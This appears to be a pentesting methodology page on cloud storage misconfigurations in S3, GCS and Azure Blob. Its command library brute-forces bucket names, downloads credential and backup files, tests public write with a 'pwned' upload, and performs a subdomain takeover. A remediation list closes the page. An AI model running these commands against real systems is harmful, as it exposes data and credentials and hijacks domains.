---
title: "Cloud Storage Misconfigurations"
date: 2026-02-24
draft: false
---

# Cloud Storage Misconfigurations

> **Severity**: High–Critical | **CWE**: CWE-732, CWE-200
> **OWASP**: A05:2021 – Security Misconfiguration

---

## What Are Cloud Storage Misconfigs?

Cloud storage buckets (AWS S3, Google Cloud Storage, Azure Blob, DigitalOcean Spaces) default to private, but misconfigurations expose them publicly — allowing data read, write, or full takeover. Write access enables content injection, website defacement, or subdomain takeover.

---

## Discovery Checklist

- [ ] Enumerate bucket names from JS, HTML, API responses, SSL certs
- [ ] Try predictable bucket names: `company-backup`, `company-assets`, `company-files`
- [ ] Test `s3://bucket-name` for public listability (`aws s3 ls`)
- [ ] Test read access: download sensitive files (backups, configs, keys)
- [ ] Test write access: upload a file, check if it's accessible
- [ ] Check ACL: public-read, public-read-write, authenticated-read
- [ ] Check for exposed `.env`, `*.pem`, `*.key`, `backup.sql` files
- [ ] Test Azure Blob Container public access level
- [ ] Test GCS bucket IAM (allUsers, allAuthenticatedUsers)
- [ ] Look for signed URL leakage (S3 pre-signed URLs in responses/logs)

---

## Payload Library

### Attack 1 — AWS S3 Enumeration

```bash
# Check if bucket exists and is public:
curl -s "https://BUCKET_NAME.s3.amazonaws.com/" | grep -i "ListBucketResult\|Access Denied\|NoSuchBucket"

# List bucket contents (if public list):
aws s3 ls s3://BUCKET_NAME --no-sign-request
aws s3 ls s3://BUCKET_NAME --no-sign-request --recursive

# Download all files (public read):
aws s3 sync s3://BUCKET_NAME /tmp/bucket_dump --no-sign-request

# Try common bucket name patterns:
TARGET="company-name"
for suffix in "" "-backup" "-assets" "-static" "-dev" "-staging" \
              "-prod" "-files" "-uploads" "-media" "-data" "-logs" \
              "-config" "-secret" "-private" "-internal"; do
  bucket="${TARGET}${suffix}"
  status=$(curl -so /dev/null -w "%{http_code}" \
    "https://${bucket}.s3.amazonaws.com/")
  echo "${bucket}: $status"
done

# Check bucket region:
curl -s "https://BUCKET_NAME.s3.amazonaws.com/" -I | grep -i "x-amz-bucket-region"

# Authenticated enumeration (with own AWS credentials):
aws s3api list-objects --bucket BUCKET_NAME --output json | \
  jq '.Contents[].Key'

# Test write access:
echo "pentest" > /tmp/test.txt
aws s3 cp /tmp/test.txt s3://BUCKET_NAME/pentest_test.txt --no-sign-request
# If succeeds → public write (critical!)
```

### Attack 2 — Interesting Files to Hunt

```bash
# Search for sensitive files once you have read access:
BUCKET="target-bucket"

# Database dumps:
aws s3 ls s3://$BUCKET --recursive --no-sign-request | \
  grep -iE "\.sql|\.dump|\.bak|\.backup"

# Config and secrets:
aws s3 ls s3://$BUCKET --recursive --no-sign-request | \
  grep -iE "\.env|config\.|secret|credentials|\.pem|\.key|\.p12|\.pfx"

# Code:
aws s3 ls s3://$BUCKET --recursive --no-sign-request | \
  grep -iE "\.php|\.py|\.js|\.rb|\.jar|\.war"

# Download interesting files:
aws s3 cp s3://$BUCKET/.env /tmp/.env --no-sign-request
aws s3 cp s3://$BUCKET/backup.sql /tmp/backup.sql --no-sign-request
aws s3 cp s3://$BUCKET/config.json /tmp/config.json --no-sign-request
```

### Attack 3 — Google Cloud Storage (GCS)

```bash
# Check public bucket:
curl -s "https://storage.googleapis.com/BUCKET_NAME/" | \
  grep -i "Contents\|AccessDenied\|NoSuchBucket"

# List with gsutil:
gsutil ls gs://BUCKET_NAME
gsutil ls -r gs://BUCKET_NAME   # recursive

# Check IAM policy:
gsutil iam get gs://BUCKET_NAME

# Download:
gsutil cp gs://BUCKET_NAME/sensitive_file /tmp/

# Test all-users read:
curl -s "https://storage.googleapis.com/BUCKET_NAME/test_file" -I

# Find GCS buckets via HTTPS:
curl -s "https://BUCKET_NAME.storage.googleapis.com/"
```

### Attack 4 — Azure Blob Storage

```bash
# Check container public access:
curl -s "https://ACCOUNT_NAME.blob.core.windows.net/CONTAINER_NAME?restype=container&comp=list" | \
  grep -i "EnumerationResults\|AuthorizationFailed\|ResourceNotFound"

# List blobs (public container):
curl -s "https://ACCOUNT_NAME.blob.core.windows.net/CONTAINER_NAME?restype=container&comp=list"

# Download blob:
curl -s "https://ACCOUNT_NAME.blob.core.windows.net/CONTAINER_NAME/BLOB_NAME" -o file

# Test write (public write):
curl -X PUT "https://ACCOUNT_NAME.blob.core.windows.net/CONTAINER_NAME/pwned.txt" \
  -H "x-ms-blob-type: BlockBlob" \
  -d "compromised"

# Azure enumeration tool:
pip3 install blobstoragemicroscope
# Or use MicroBurst:
# https://github.com/NetSPI/MicroBurst
```

### Attack 5 — Subdomain Takeover via S3

```bash
# CNAME pointing to unclaimed S3 bucket:
# static.target.com → target-static.s3-website-us-east-1.amazonaws.com
# Bucket doesn't exist → claim it

# Create bucket with same name:
aws s3api create-bucket --bucket target-static --region us-east-1
aws s3 website s3://target-static/ --index-document index.html
aws s3api put-bucket-policy --bucket target-static --policy '{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "PublicRead",
    "Effect": "Allow",
    "Principal": "*",
    "Action": ["s3:GetObject"],
    "Resource": "arn:aws:s3:::target-static/*"
  }]
}'

# Upload PoC:
echo '<html><body>Subdomain Takeover via S3</body></html>' > index.html
aws s3 cp index.html s3://target-static/
```

---

## Tools

```bash
# S3Scanner:
pip3 install s3scanner
s3scanner scan --buckets target-backup,target-assets,target-prod

# CloudBrute — cloud storage brute forcing:
git clone https://github.com/0xsha/CloudBrute
./CloudBrute -d target.com -k target -m storage -l 200 -o results.txt

# GrayhatWarfare — search public buckets:
# https://buckets.grayhatwarfare.com (web UI)

# bucket-finder:
bucket_finder.rb target.com

# truffleHog — find secrets in bucket contents:
trufflehog s3 --bucket=BUCKET_NAME

# AWS CLI:
aws s3 ls s3://BUCKET --no-sign-request
aws s3api get-bucket-acl --bucket BUCKET --no-sign-request
aws s3api get-bucket-policy --bucket BUCKET --no-sign-request

# Check CORS on S3:
curl -sI "https://BUCKET.s3.amazonaws.com/" \
  -H "Origin: https://evil.com" | grep -i "access-control"

# Find buckets from SSL certs / JS files:
grep -rn "s3\.amazonaws\.com\|s3-.*\.amazonaws\.com\|\.storage\.googleapis\.com" \
  --include="*.js" .
```

---

## Remediation Reference

- **Block all public access**: AWS S3 "Block Public Access" setting at account level
- **Explicit deny policy**: add bucket policy that denies `s3:*` to `*` (public)
- **Use presigned URLs** for temporary access instead of public buckets
- **Enable S3 server access logging**: detect unauthorized access attempts
- **Apply principle of least privilege** to IAM roles that access buckets
- **Enable MFA Delete** on S3 buckets containing critical data
- **Regular audit**: use AWS Config, GCP Security Command Center, or Azure Defender to continuously check bucket permissions
- **Avoid predictable bucket names**: don't use company name + common suffixes

*Part of the Web Application Penetration Testing Methodology series.*
